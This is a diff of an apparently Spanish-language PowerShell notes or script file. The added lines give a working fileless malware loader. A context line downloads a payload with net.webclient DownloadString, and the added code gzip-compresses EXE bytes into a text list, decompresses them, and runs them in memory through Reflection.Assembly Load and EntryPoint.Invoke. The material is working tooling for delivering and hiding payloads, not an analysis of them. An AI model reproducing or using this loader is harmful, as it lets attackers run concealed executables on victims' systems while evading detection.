@@ -67,10 +67,47 @@ $cargaSTR = (New-Object net.webclient).DownloadString('$linkcodi')
 [System.Reflection.Assembly]::Load([Byte[]]($CARGABYTES)).entrypoint.invoke($null,$null)
 
 
-COMPRESION DE BYTES
+COMPRESION DE BYTES PUNTO ENTRADA COMPLETO
+
+1 [Reflection.Assembly]::Load([Byte[]](BYTES DE UN EXE)).EntryPoint.Invoke($null,$null)
+
+
+function B2G {
+    param([byte[]]$Data)
+    Process {
+    $out = [System.IO.MemoryStream]::new()
+    $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress)
+
+      $gStream.Write($Data, 0, $Data.Length)
+      $gStream.Close()
+    return $out.ToArray()
+  }
+   }
+   
+[Byte[]]$CARGA = ()
+$CONVERT = B2G $CARGA
+$CONVERT-join "," | Out-File c:\salida.txt
 
 
 
+function G2B {  
+param([byte[]]$Data)
+	Process {
+        $SrcData = New-Object System.IO.MemoryStream( , $Data )
+	    $output = New-Object System.IO.MemoryStream
+        $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress)
+	    $gStream.CopyTo( $output )
+        $gStream.Close()
+		$SrcData.Close()
+		[byte[]] $byteArr = $output.ToArray()
+        return $byteArr
+    }
+}
+
+[Byte[]]$CARGA = (bytes)
+$call = G2B $CARGA
+
+[System.Reflection.Assembly]::Load([Byte[]]($call)).entrypoint.invoke($null,$null)
 
 
 
